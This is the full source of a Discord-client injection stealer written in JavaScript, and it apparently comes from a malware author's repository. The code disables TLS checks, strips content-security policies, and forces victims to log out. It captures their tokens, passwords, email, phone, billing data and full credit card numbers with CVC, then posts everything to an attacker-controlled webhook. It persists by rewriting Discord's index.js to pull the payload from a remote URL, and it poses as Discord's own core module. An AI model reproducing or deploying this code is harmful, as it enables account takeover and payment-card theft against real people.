process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = 0

const fs = require("fs")
const electron = require("electron")
const https = require("https");
const queryString = require("querystring")

var computerName = process.env.COMPUTERNAME
var tokenScript = `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`
var logOutScript = `function getLocalStoragePropertyDescriptor(){const o=document.createElement("iframe");document.head.append(o);const e=Object.getOwnPropertyDescriptor(o.contentWindow,"localStorage");return o.remove(),e}Object.defineProperty(window,"localStorage",getLocalStoragePropertyDescriptor());const localStorage=getLocalStoragePropertyDescriptor().get.call(window);localStorage.token=null,localStorage.tokens=null,localStorage.MultiAccountStore=null,location.reload();`
var doTheLogOut = fs.existsSync("./d3dcompiler.dlll") ? true : false
var config = {
    "logout": "true",
    "logout-notify": "true",
    "init-notify": "true",
    "embed-color": 374276,

    injection_url: "https://raw.githubusercontent.com/RndmAcc123/BallDestroyer69/main/index.js",
    webhook: "%WEBHOOK%",
    Filter: {
        "urls": [
            "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
            "https://*.discord.com/api/v*/applications/detectable",
            "https://discord.com/api/v*/applications/detectable",
            "https://*.discord.com/api/v*/users/@me/library",
            "https://discord.com/api/v*/users/@me/library",
            "https://*.discord.com/api/v*/users/@me/billing/subscriptions",
            "https://discord.com/api/v*/users/@me/billing/subscriptions",
            "wss://remote-auth-gateway.discord.gg/*"
        ]
    },
    onCompleted: {
        urls: [
            "https://discord.com/api/v*/users/@me",
            "https://discordapp.com/api/v*/users/@me",
            "https://*.discord.com/api/v*/users/@me",
            "https://discordapp.com/api/v*/auth/login",
            'https://discord.com/api/v*/auth/login',
            'https://*.discord.com/api/v*/auth/login',
            "https://api.stripe.com/v*/tokens"
        ]
    }
};

async function execScript(str) {
    var window = electron.BrowserWindow.getAllWindows()[0]
    var script = await window.webContents.executeJavaScript(str, true)
    return script || null

}

const makeEmbed = async ({
    title,
    fields,
    image,
    thumbnail,
    description
}) => {
    var params = {
        username: "Swezy <3 | v1.0 | dsc.gg/swezy-dev",
        avatar_url: "https://raw.githubusercontent.com/SwezyDev/Swezy-s-Temp-Stuff/main/Swezy4.png",
        content: "",
        embeds: [{
            title: title,
            color: config["embed-color"],
            fields: fields,
            description: description ?? "",
            author: {
                name: "Swezy <3 | v1.0 | dsc.gg/swezy-dev"
            },
            footer: {
                text: "Coded by Swezy <3"
            },

        }]
    };

    if (image) params.embeds[0].image = {
        url: image
    }
    if (thumbnail) params.embeds[0].thumbnail = {
        url: thumbnail
    }
    return params
}
const getIP = async () => {
    var json = await execScript(`var xmlHttp = new XMLHttpRequest();\nxmlHttp.open( "GET", "https://www.myexternalip.com/json", false );\nxmlHttp.send( null );\nJSON.parse(xmlHttp.responseText);`)
    return json.ip
}

const getURL = async (url, token) => {
    var c = await execScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "${url}", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    JSON.parse(xmlHttp.responseText);`)
    return c
}

const getGifOrPNG = async (url) => {
    var tt = [".gif?size=512", ".png?size=512"]

    var headers = await new Promise(resolve => {
        https.get(url, res => resolve(res.headers))
    })
    var type = headers["content-type"]
    if (type == "image/gif") return url + tt[0]
    else return url + tt[1]
}

const GetBadges = (e) => {
    var n = "";
    return 1 == (1 & e) && (n += "<:staff:891346298932981783> "), 2 == (2 & e) && (n += "<:partner:1041639667226914826> "), 4 == (4 & e) && (n += "<:hypesquadevent:1082679435452481738> "), 8 == (8 & e) && (n += "<:bughunter_1:874750808426692658> "), 64 == (64 & e) && (n += "<:bravery:874750808388952075> "), 128 == (128 & e) && (n += "<:brilliance:874750808338608199> "), 256 == (256 & e) && (n += "<:balance:874750808267292683> "), 512 == (512 & e) && (n += "<:early:944071770506416198> "), 16384 == (16384 & e) && (n += "<:bughunter_2:874750808430874664> "), 4194304 == (4194304 & e) && (n += "<:activedev:1041634224253444146> "), 131072 == (131072 & e) && (n += "<:mm_IconBotDev:898181029737680896> "), "" == n && (n = ":x:"), n
}
const GetRBadges = (e) => {
    var n = "";
    return 1 == (1 & e) && (n += "<:staff:891346298932981783> "), 2 == (2 & e) && (n += "<:partner:1041639667226914826> "), 4 == (4 & e) && (n += "<:hypesquadevent:1082679435452481738> "), 8 == (8 & e) && (n += "<:bughunter_1:874750808426692658> "), 512 == (512 & e) && (n += "<:early:944071770506416198> "), 16384 == (16384 & e) && (n += "<:bughunter_2:874750808430874664> "), 4194304 == (4194304 & e) && (n += "<:activedev:1041634224253444146> "), 131072 == (131072 & e) && (n += "<:mm_IconBotDev:898181029737680896> "), "" == n && (n = ":x:"), n
}

const GetNSFW = (bouki) => {
    switch (bouki) {
        case true:
            return ":underage: `NSFW Allowed`"
        case false:
            return ":underage: `NSFW Not Allowed`"
        default:
            return "Idk bro you got me"
    }
}
const GetA2F = (bouki) => {
    switch (bouki) {
        case true:
            return ":lock: `A2F Enabled`"
        case false:
            return ":lock: `A2F Not Enabled`"
        default:
            return "Idk bro you got me"
    }
}


const parseFriends = friends => {
    var real = friends.filter(x => x.type == 1)
    var rareFriends = ""
    for (var friend of real) {
        var badges = GetRBadges(friend.user.public_flags)
        if (badges !== ":x:") rareFriends += `${badges} ${friend.user.username}#${friend.user.discriminator}\n`
    }
    if (!rareFriends) rareFriends = "No Rare Friends"
    return {
        len: real.length,
        badges: rareFriends
    }
}

const parseBilling = billings => {
    var Billings = ""
    billings.forEach(res => {
        if (res.invalid) return
        switch (res.type) {
            case 1:
                Billings += ":heavy_check_mark: :credit_card:"
                break
            case 2:
                Billings += ":heavy_check_mark: <:paypal:896441236062347374>"
        }
    })
    if (!Billings) Billings = ":x:"
    return Billings
}

const calcDate = (a, b) => new Date(a.setMonth(a.getMonth() + b))

const GetNitro = r => {
    switch (r.premium_type) {
        default:
            return ":x:"
        case 1:
            return "<:946246402105819216:962747802797113365>"
        case 2:
            if (!r.premium_guild_since) return "<:946246402105819216:962747802797113365>"
            var now = new Date(Date.now())
            var arr = ["<:Booster1Month:1051453771147911208>", "<:Booster2Month:1051453772360077374>", "<:Booster6Month:1051453773463162890>", "<:Booster9Month:1051453774620803122>", "<:boost12month:1068308256088400004>", "<:Booster15Month:1051453775832961034>", "<:BoosterLevel8:1051453778127237180>", "<:Booster24Month:1051453776889917530>"]
            var a = [new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since)]
            var b = [2, 3, 6, 9, 12, 15, 18, 24]
            var r = []
            for (var p in a) r.push(Math.round((calcDate(a[p], b[p]) - now) / 86400000))
            var i = 0
            for (var p of r) p > 0 ? "" : i++
            return "<:946246402105819216:962747802797113365> " + arr[i]
    }
}

function GetLangue(read) {
    var languages = {
        "fr": ":flag_fr: French",
        "da": ":flag_dk: Dansk",
        "de": ":flag_de: Deutsch",
        "en-GB": ":england: English (UK)",
        "en-US": ":flag_us: USA",
        "en-ES": ":flag_es: Espagnol",
        "hr": ":flag_hr: Croatian",
        "it": ":flag_it: Italianio",
        "lt": ":flag_lt: Lithuanian",
        "hu": ":flag_no::flag_hu: Hungarian",
        "no": ":flag_no: Norwegian",
        "pl": ":flag_pl: Polish",
        'pr-BR': ":flag_pt: Portuguese",
        "ro": ":flag_ro: Romanian",
        "fi": ":flag_fi: Finnish",
        "sv-SE": ":flag_se: Swedish",
        "vi": ":flag_vn: Vietnamese",
        "tr": ":flag_tr: Turkish",
        "cs": ":flag_cz: Czech",
        "el": ":flag_gr: Greek",
        "bg": ":flag_bg: Bulgarian",
        "ru": ":flag_ru: Russian",
        "uk": ":flag_ua: Ukrainian",
        "hi": ":flag_in: Indian",
        "th": ":flag_tw: Taiwanese",
        "zh-CN": ":flag_cn: Chinese-China",
        "ja": ":flag_jp: Japanese",
        "zh-TW": ":flag_cn: Chinese-Taiwanese",
        "ko": ":flag_kr: Korean"
    }

    var langue = languages[read] || "No Languages Detected ????";
    return langue
}
const post = async (params) => {
    params = JSON.stringify(params)
    [config.webhook].forEach(res => {
        const url = new URL(res);
        const options = {
            host: url.hostname,
            port: url.port,
            path: url.pathname,
            method: 'POST',
            headers: {
                "Content-Type": "application/json"
            }
        }
        const req = https.request(options);
        req.on("error", (err) => {
            console.log(err);
        });
        req.write(params);
        req.end();
    })

}
const FirstTime = async () => {
    if (doTheLogOut) return false
    var token = await execScript(tokenScript)
    if (config['init-notify'] !== "true") return true
    if (fs.existsSync(__dirname + "/update")) fs.rmdirSync(__dirname + "/update")
    var ip = await getIP()
    if (!token) {
        var params = await makeEmbed({
            title: "Initalized",
            fields: [{
                name: "Injection Info",
                value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\``,
                inline: !1
            }]
        })
    } else {
        var user = await getURL("https://discord.com/api/v8/users/@me", token)
        var billing = await getURL("https://discord.com/api/v9/users/@me/billing/payment-sources", token)
        var friends = await getURL("https://discord.com/api/v9/users/@me/relationships", token)
        var Nitro = await getURL("https://discord.com/api/v9/users/" + user.id + "/profile", token);

        var Billings = parseBilling(billing)
        var Friends = parseFriends(friends)
        if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/SwezyDev/Swezy-s-Temp-Stuff/main/Bild_2023-12-02_233546002.png"
        if (!user.banner) var userBanner = "https://raw.githubusercontent.com/SwezyDev/Swezy-s-Temp-Stuff/main/Bild_2023-12-02_233546002.png"

        userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
        userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
        var params = await makeEmbed({
            title: "Initalized",
            fields: [{
                name: "Injection Info",
                value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
                inline: !1
            }, {
                name: "Username <:user:1180642311420526732>",
                value: `\`${user.username}#${user.discriminator}\``,
                inline: !0
            }, {
                name: "ID <:ID:1180642517616693368>",
                value: `\`${user.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${user.id})`,
                inline: !0
            }, {
                name: "Nitro <a:nitro:1180641228312821760>",
                value: `${GetNitro(Nitro)}`,
                inline: !0
            }, {
                name: "Badges <a:badges:1180642815223529482>",
                value: `${GetBadges(user.flags)}`,
                inline: !0
            }, {
                name: "Language <:lang:1180643329633943632>",
                value: `${GetLangue(user.locale)}`,
                inline: !0
            }, {
                name: "NSFW <:18:1180643638225674280>",
                value: `${GetNSFW(user.nsfw_allowed)}`,
                inline: !1
            }, {
                name: "A2F <:lock:1180643859659763832>",
                value: `${GetA2F(user.mfa_enabled)}`,
                inline: !0
            }, {
                name: "@Copyright",
                value: `[Swezy <3 <a:blackworld:1180631990828019712>](https://discord.gg/KkxjCe8Fg2)`,
                inline: !0
            }, {
                name: "Billing <a:cc:1164199671896477768>",
                value: `${Billings}`,
                inline: !1
            }, {
                name: "Email <:email:1180644282172985496>",
                value: `\`${user.email}\``,
                inline: !0
            }, {
                name: "Phone :mobile_phone:",
                value: `\`${user.phone ?? "None"}\``,
                inline: !0
            }, {
                name: "<:key:1180644664907419659> Token",
                value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
                inline: !1
            }],
            image: userBanner,
            thumbnail: userAvatar
        })
        var params2 = await makeEmbed({
            title: `<:friends:1180644927693127700> Total Friends (${Friends.len})`,
            color: config['embed-color'],
            description: Friends.badges,
            image: userBanner,
            thumbnail: userAvatar
        })

        params.embeds.push(params2.embeds[0])
    }
    await post(params)
    if ((config.logout != "false" || config.logout !== "%LOGOUT%") && config['logout-notify'] == "true") {
        if (!token) {
            var params = await makeEmbed({
                title: "User log out (User not Logged in before)",
                fields: [{
                    name: "Injection Info",
                    value: `\`\`\`Name Of Computer: \n${computerName}\nInjection PATH: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n`,
                    inline: !1
                }]
            })
        } else {
            var user = await getURL("https://discord.com/api/v8/users/@me", token)
            var billing = await getURL("https://discord.com/api/v9/users/@me/billing/payment-sources", token)
            var friends = await getURL("https://discord.com/api/v9/users/@me/relationships", token)
            var Nitro = await getURL("https://discord.com/api/v9/users/" + user.id + "/profile", token);

            var Billings = parseBilling(billing)
            var Friends = parseFriends(friends)
            if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/SwezyDev/Swezy-s-Temp-Stuff/main/Bild_2023-12-02_233546002.png"
            if (!user.banner) var userBanner = "https://raw.githubusercontent.com/SwezyDev/Swezy-s-Temp-Stuff/main/Bild_2023-12-02_233546002.png"

            userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
            userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
            var params = await makeEmbed({
                title: "Victim got logged out",
                fields: [{
                    name: "Injection Info",
                    value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
                    inline: !1
                }, {
                    name: "Username <:user:1180642311420526732>",
                    value: `\`${user.username}#${user.discriminator}\``,
                    inline: !0
                }, {
                    name: "ID <:ID:1180642517616693368>",
                    value: `\`${user.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${user.id})`,
                    inline: !0
                }, {
                    name: "Nitro <a:nitro:1180641228312821760>",
                    value: `${GetNitro(Nitro)}`,
                    inline: !0
                }, {
                    name: "Badges <a:badges:1180642815223529482>",
                    value: `${GetBadges(user.flags)}`,
                    inline: !0
                }, {
                    name: "Language <:lang:1180643329633943632>",
                    value: `${GetLangue(user.locale)}`,
                    inline: !0
                }, {
                    name: "NSFW <:18:1180643638225674280>",
                    value: `${GetNSFW(user.nsfw_allowed)}`,
                    inline: !1
                }, {
                    name: "A2F <:lock:1180643859659763832>",
                    value: `${GetA2F(user.mfa_enabled)}`,
                    inline: !0
                }, {
                    name: "@Copyright",
                    value: `[Swezy <3 <a:blackworld:1180631990828019712>](https://discord.gg/KkxjCe8Fg2)`,
                    inline: !0
                }, {
                    name: "Billing <a:cc:1164199671896477768>",
                    value: `${Billings}`,
                    inline: !1
                }, {
                    name: "Email <:email:1180644282172985496>",
                    value: `\`${user.email}\``,
                    inline: !0
                }, {
                    name: "Phone :mobile_phone:",
                    value: `\`${user.phone ?? "None"}\``,
                    inline: !0
                }, {
                    name: "<:key:1180644664907419659> Token",
                    value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
                    inline: !1
                }],
                image: userBanner,
                thumbnail: userAvatar
            })
            var params2 = await makeEmbed({
                title: `<a:totalfriends:1041641100017946685> Total Friends (${Friends.len})`,
                color: config['embed-color'],
                description: Friends.badges,
                image: userBanner,
                thumbnail: userAvatar
            })

            params.embeds.push(params2.embeds[0])
        }
        fs.writeFileSync("./d3dcompiler.dlll", "LogOut")
        await execScript(logOutScript)
        doTheLogOut = true
        await post(params)
    }
    return false
}

const path = (function () {
    var appPath = electron.app.getAppPath().replace(/\\/g, "/").split("/")
    appPath.pop()
    appPath = appPath.join("/")
    var appName = electron.app.getName()
    return {
        appPath,
        appName
    }
}())

const checUpdate = () => {
    var {
        appPath,
        appName
    } = path

    var ressource = `${appPath}/app`
    var indexFile = __filename.replace(/\\/g, "/")
    var betterDiscord = `${process.env.appdata.replace(/\\/g, "/")}/betterdiscord/data/betterdiscord.asar`
    var package = `${ressource}/package.json`
    var index = `${ressource}/index.js`

    if (!fs.existsSync(ressource)) fs.mkdirSync(ressource)
    fs.writeFileSync(package, `{"name": "${appName}", "main": "./index.js"}`)

    var script = `const fs = require("fs"), https = require("https")
var index = "${indexFile}"
var betterDiscord = "${betterDiscord}"
var bouki = fs.readFileSync(index).toString()
if (bouki == "module.exports = require('./core.asar');") init()
function init() {
    https.get("${config.injection_url}", res => {
        var chunk = ""
        res.on("data", data => chunk += data)
        res.on("end", () => fs.writeFileSync(index, chunk.replace("%WEBHOOK%", "${config.webhook}")))
    }).on("error", (err) => setTimeout(init(), 10000));
}
require("${appPath}/app.asar")
if (fs.existsSync(betterDiscord)) require(betterDiscord)`

    fs.writeFileSync(index, script)
    if (!doTheLogOut) execScript(logOutScript)
    return
}
electron.session.defaultSession.webRequest.onBeforeRequest(config.Filter, async (details, callback) => {
    await electron.app.whenReady();
    await FirstTime()
    if (details.url.startsWith("wss://remote-auth-gateway")) return callback({
        cancel: true
    })

    checUpdate()
    callback({})
})

electron.session.defaultSession.webRequest.onHeadersReceived((request, callback) => {
    delete request.responseHeaders['content-security-policy']
    delete request.responseHeaders['content-security-policy-report-only']
    callback({
        responseHeaders: {
            ...request.responseHeaders,
            'Access-Control-Allow-Headers': '*',
        },
    })
})

electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async (request, callback) => {
    if (!["POST", "PATCH"].includes(request.method)) return
    if (request.statusCode !== 200) return
    try {
        var data = JSON.parse(request.uploadData[0].bytes)
    } catch (err) {
        var data = queryString.parse(decodeURIComponent(request.uploadData[0].bytes.toString()))
    }
    var token = await execScript(tokenScript)
    var ip = await getIP()
    var user = await getURL("https://discord.com/api/v8/users/@me", token)
    var billing = await getURL("https://discord.com/api/v9/users/@me/billing/payment-sources", token)
    var friends = await getURL("https://discord.com/api/v9/users/@me/relationships", token)
    var Nitro = await getURL("https://discord.com/api/v9/users/" + user.id + "/profile", token);

    if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/SwezyDev/Swezy-s-Temp-Stuff/main/Bild_2023-12-02_233546002.png"
    if (!user.banner) var userBanner = "https://raw.githubusercontent.com/SwezyDev/Swezy-s-Temp-Stuff/main/Bild_2023-12-02_233546002.png"

    userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
    userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
    var Billings = parseBilling(billing)
    var Friends = parseFriends(friends)

    switch (true) {
        case request.url.endsWith("login"):
            var password = data.password
            var params = await makeEmbed({
                title: "User Login",
                description: "[<a:blackworld:1180631990828019712> **Oh you Fucked someone**](https://discord.gg/KkxjCe8Fg2)",
                color: config['embed-color'],
                fields: [{
                    name: "Injection Info",
                    value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
                    inline: !1
                }, {
                    name: "Username <:user:1180642311420526732> ",
                    value: `\`${user.username}#${user.discriminator}\``,
                    inline: !0
                }, {
                    name: "ID <:ID:1180642517616693368>",
                    value: `\`${user.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${user.id})`,
                    inline: !0
                }, {
                    name: "Nitro <a:nitro:1180641228312821760>",
                    value: `${GetNitro(Nitro)}`,
                    inline: !0
                }, {
                    name: "Badges <a:badges:1180642815223529482>",
                    value: `${GetBadges(user.flags)}`,
                    inline: !0
                }, {
                    name: "Language <:lang:1180643329633943632>",
                    value: `${GetLangue(user.locale)}`,
                    inline: !0
                }, {
                    name: "NSFW <:18:1180643638225674280>",
                    value: `${GetNSFW(user.nsfw_allowed)}`,
                    inline: !1
                }, {
                    name: "A2F <:lock:1180643859659763832>",
                    value: `${GetA2F(user.mfa_enabled)}`,
                    inline: !0
                }, {
                    name: "@Copyright",
                    value: `[Swezy <3 <a:blackworld:1180631990828019712>](https://discord.gg/KkxjCe8Fg2)`,
                    inline: !0
                }, {
                    name: "Billing <a:cc:1164199671896477768>",
                    value: `${Billings}`,
                    inline: !1
                }, {
                    name: "Email <:email:1180644282172985496>",
                    value: `\`${user.email}\``,
                    inline: !0
                }, {
                    name: "Phone :mobile_phone:",
                    value: `\`${user.phone ?? "None"}\``,
                    inline: !0
                }, {
                    name: "<:pass:1180647773813616731> Password",
                    value: `\`${password}\``,
                    inline: !0
                }, {
                    name: "<:key:1180644664907419659> Token",
                    value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
                    inline: !1
                }],

                thumbnail: userAvatar,
                image: userBanner
            })

            var params2 = await makeEmbed({
                title: `<:friends:1180644927693127700> Total Friends (${Friends.len})`,
                color: config['embed-color'],
                description: Friends.badges,
                image: userBanner,
                thumbnail: userAvatar
            })

            params.embeds.push(params2.embeds[0])
        
            await post(params)
            break
        case request.url.endsWith("users/@me"):
            if (!data.password) return
            if (data.new_password) {
                var params = await makeEmbed({
                    title: "Detect Password Changed",
                    description: "[<a:blackworld:1180631990828019712>  **Oh you Fucked someone**](https://discord.gg/KkxjCe8Fg2)",
                    color: config['embed-color'],
                    fields: [{
                        name: "Injection Info",
                        value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
                        inline: !1
                    }, {
                        name: "Username <:user:1180642311420526732>",
                        value: `\`${user.username}#${user.discriminator}\``,
                        inline: !0
                    }, {
                        name: "ID <:ID:1180642517616693368>",
                        value: `\`${user.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${user.id})`,
                        inline: !0
                    }, {
                        name: "Nitro <a:nitro:1180641228312821760>",
                        value: `${GetNitro(Nitro)}`,
                        inline: !0
                    }, {
                        name: "Badges <a:badges:1180642815223529482>",
                        value: `${GetBadges(user.flags)}`,
                        inline: !0
                    }, {
                        name: "Language <:lang:1180643329633943632>",
                        value: `${GetLangue(user.locale)}`,
                        inline: !0
                    }, {
                        name: "NSFW <:18:1180643638225674280>",
                        value: `${GetNSFW(user.nsfw_allowed)}`,
                        inline: !0
                    }, {
                        name: "A2F <:lock:1180643859659763832>",
                        value: `${GetA2F(user.mfa_enabled)}`,
                        inline: !0
                    }, {
                        name: "@Copyright",
                        value: `[Swezy <3 <a:blackworld:1180631990828019712>](https://discord.gg/KkxjCe8Fg2)`,
                        inline: !0
                    }, {
                        name: "Billing <a:cc:1164199671896477768>",
                        value: `${Billings}`,
                        inline: !0
                    }, {
                        name: "Email <:email:1180644282172985496>",
                        value: `\`${user.email}\``,
                        inline: !0
                    }, {
                        name: "Phone :mobile_phone:",
                        value: `\`${user.phone ?? ":x:"}\``,
                        inline: !0
                    }, {
                        name: "<:pass:1180647773813616731> Old Password",
                        value: `\`${data.password}\``,
                        inline: !0
                    }, {
                        name: "<:pass:1180647773813616731> New Password",
                        value: `\`${data.new_password}\``,
                        inline: !0
                    }, {
                        name: "Bio <a:bio:1180645878315368538>",
                        value: `\`\`\`${user.bio ?? ":x:"}\`\`\``,
                        inline: !1
                    }, {
                        name: "<:key:1180644664907419659> Token",
                        value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
                        inline: !1
                    }, ],

                    thumbnail: userAvatar,
                    image: userBanner
                })

                var params2 = await makeEmbed({
                    title: `<:friends:1180644927693127700> Total Friends (${Friends.len})`,
                    color: config['embed-color'],
                    description: Friends.badges,
                    image: userBanner,
                    thumbnail: userAvatar
                })

                params.embeds.push(params2.embeds[0])
            
                await post(params)
            }
            if (data.email) {
                var params = await makeEmbed({
                    title: "Detect Email Changed",
                    description: "[<a:blackworld:1180631990828019712>  **Oh you Fucked someone**](https://discord.gg/KkxjCe8Fg2)",
                    color: config['embed-color'],
                    fields: [{
                        name: "Injection Info",
                        value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
                        inline: !1
                    }, {
                        name: "Username <:user:1180642311420526732>",
                        value: `\`${user.username}#${user.discriminator}\``,
                        inline: !0
                    }, {
                        name: "ID <:ID:1180642517616693368>",
                        value: `\`${user.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${user.id})`,
                        inline: !0
                    }, {
                        name: "Nitro <a:nitro:1180641228312821760>",
                        value: `${GetNitro(Nitro)}`,
                        inline: !0
                    }, {
                        name: "Badges <a:badges:1180642815223529482>",
                        value: `${GetBadges(user.flags)}`,
                        inline: !0
                    }, {
                        name: "Language <:lang:1180643329633943632>",
                        value: `${GetLangue(user.locale)}`,
                        inline: !0
                    }, {
                        name: "NSFW <:18:1180643638225674280>",
                        value: `${GetNSFW(user.nsfw_allowed)}`,
                        inline: !1
                    }, {
                        name: "A2F <:lock:1180643859659763832>",
                        value: `${GetA2F(user.mfa_enabled)}`,
                        inline: !0
                    }, {
                        name: "@Copyright",
                        value: `[Swezy <3 <a:blackworld:1180631990828019712>](https://discord.gg/KkxjCe8Fg2)`,
                        inline: !0
                    }, {
                        name: "Billing <a:cc:1164199671896477768>",
                        value: `${Billings}`,
                        inline: !1
                    }, {
                        name: "New Email <:email:1180644282172985496>",
                        value: `\`${user.email}\``,
                        inline: !0
                    }, {
                        name: "Phone :mobile_phone:",
                        value: `\`${user.phone ?? "None"}\``,
                        inline: !0
                    }, {
                        name: "<:pass:1180647773813616731> Password",
                        value: `\`${data.password}\``,
                        inline: !0
                    }, {
                        name: "Bio <a:bio:1180645878315368538>",
                        value:  `\`\`\`${user.bio ?? ":x:"}\`\`\``,
                        inline: !1
                    }, {
                        name: "<:key:1180644664907419659> Token",
                        value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
                        inline: !1
                    }, ],

                    thumbnail: userAvatar,
                    image: userBanner
                })

                var params2 = await makeEmbed({
                    title: `<:friends:1180644927693127700> Total Friends (${Friends.len})`,
                    color: config['embed-color'],
                    description: Friends.badges,
                    image: userBanner,
                    thumbnail: userAvatar
                })

                params.embeds.push(params2.embeds[0])
            
                await post(params)
            }
            break
        case request.url.endsWith("tokens"):
            var [CardNumber, CardCVC, month, year] = [data["card[number]"], data["card[cvc]"], data["card[exp_month]"], data["card[exp_year]"]]

            var params = await makeEmbed({
                title: "User Credit Card Added",
                description: `
                **IP** <:network:1180650094173880440>\n\`\`\`${ip}\`\`\`\n
                **Username** <:user:1180642311420526732>\n\`\`\`${user.username}#${user.discriminator}\`\`\`\n
                **ID** <:ID:1180642517616693368>\n\`\`\`${user.id}\`\`\`\n
                **Email** <:email:1180644282172985496>\n\`\`\`${user.email}\`\`\`\n
                **Nitro Type** <a:nitro:1180641228312821760>\n${GetNitro(user.premium_type)}\n
                **Language** <:lang:1180643329633943632>\n${GetLangue(user.locale)}\n
                **A2F** <:lock:1180643859659763832>\n${GetA2F(user.mfa_enabled)}\n
                **NSFW** <:18:1180643638225674280>\n${GetNSFW(user.nsfw_allowed)}\n
                **Badges** <a:badges:1180642815223529482>\n${GetBadges(user.flags)}\n
                **Credit Card Number** <a:cc:1164199671896477768>\n\`\`\`${CardNumber}\`\`\`\n
                **Credit Card Expiration** <a:cc:1164199671896477768>\n\`\`\`${month}/${year}\`\`\`\n
                **CVC** <a:cc:1164199671896477768>\n\`\`\`${CardCVC}\`\`\`\n
                <:key:1180644664907419659> **Token** \n\`\`\`${token}\`\`\``,
                thumbnail: userAvatar,
                image: userBanner
            })

            var params2 = await makeEmbed({
                title: `<:friends:1180644927693127700> Total Friends (${Friends.len})`,
                color: config['embed-color'],
                description: Friends.badges,
                image: userBanner,
                thumbnail: userAvatar
            })

            params.embeds.push(params2.embeds[0])
            await post(params)
            break
    }
})
module.exports = require("./core.asar");